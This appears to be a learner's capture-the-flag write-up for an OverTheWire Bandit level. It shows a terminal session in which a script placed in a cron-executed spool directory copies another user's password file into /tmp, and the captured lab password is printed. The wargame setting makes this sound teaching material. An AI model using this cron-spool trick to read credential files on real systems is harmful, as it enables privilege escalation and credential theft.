@@ -1,0 +1,61 @@
+This was one of the more challenging ones for me as I struggled with the chmod read/write permissions for the group/usr. At first i was trying to nano a 
+script into the spool/bandit24 directory but was getting errors when i realized this i created my own dir called moe. 
+from then the script was pretty easy to write pointing the pwd from bandit24 to paste itself in the new tmp/moe 
+
+script below: 
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/moe/pwd.txt 
+
+ bandit23@bandit:/var/spool/bandit24$ cd ~
+bandit23@bandit:~$ cd /etc/cron.d
+bandit23@bandit:/etc/cron.d$ mkdir /tmp/moe
+bandit23@bandit:/etc/cron.d$ cd /tmp/moe
+bandit23@bandit:/tmp/moe$ nano script.sh
+Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
+It is required for saving/loading search history or cursor positions.
+
+bandit23@bandit:/tmp/moe$ ls 
+script.sh
+bandit23@bandit:/tmp/moe$ ls -l script.sh
+-rw-rw-r-- 1 bandit23 bandit23 62 Dec  7 20:35 script.sh
+bandit23@bandit:/tmp/moe$ chmod +x script.sh
+bandit23@bandit:/tmp/moe$ ls -l script.sh
+-rwxrwxr-x 1 bandit23 bandit23 62 Dec  7 20:35 script.sh
+bandit23@bandit:/tmp/moe$ ls -la
+total 132
+drwxrwxr-x    2 bandit23 bandit23   4096 Dec  7 20:35 .
+drwxrwx-wt 3181 root     root     122880 Dec  7 20:34 ..
+-rwxrwxr-x    1 bandit23 bandit23     62 Dec  7 20:35 script.sh
+bandit23@bandit:/tmp/moe$ chmod +w .
+bandit23@bandit:/tmp/moe$ ls -la
+total 132
+drwxrwxr-x    2 bandit23 bandit23   4096 Dec  7 20:35 .
+drwxrwx-wt 3181 root     root     122880 Dec  7 20:34 ..
+-rwxrwxr-x    1 bandit23 bandit23     62 Dec  7 20:35 script.sh
+bandit23@bandit:/tmp/moe$ chmod 777 .
+bandit23@bandit:/tmp/moe$ ls -la
+total 132
+drwxrwxrwx    2 bandit23 bandit23   4096 Dec  7 20:35 .
+drwxrwx-wt 3181 root     root     122880 Dec  7 20:34 ..
+-rwxrwxr-x    1 bandit23 bandit23     62 Dec  7 20:35 script.sh
+bandit23@bandit:/tmp/moe$ cp script.sh /var/spool/bandit24/
+cp: cannot create regular file '/var/spool/bandit24/script.sh': Operation not permitted
+bandit23@bandit:/tmp/moe$ cp script.sh /var/spool/bandit24/foo
+bandit23@bandit:/tmp/moe$ ls
+pwd.txt  script.sh
+bandit23@bandit:/tmp/moe$ cat script.sh 
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/moe/pwd.txt 
+bandit23@bandit:/tmp/moe$ ls
+pwd.txt  script.sh
+bandit23@bandit:/tmp/moe$ cat script.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/moe/pwd.txt 
+bandit23@bandit:/tmp/moe$ cat script.sh 
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/moe/pwd.txt 
+bandit23@bandit:/tmp/moe$ cat pwd.xt
+cat: pwd.xt: No such file or directory
+bandit23@bandit:/tmp/moe$ cat pwd.txt
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+bandit23@bandit:/tmp/moe$ 
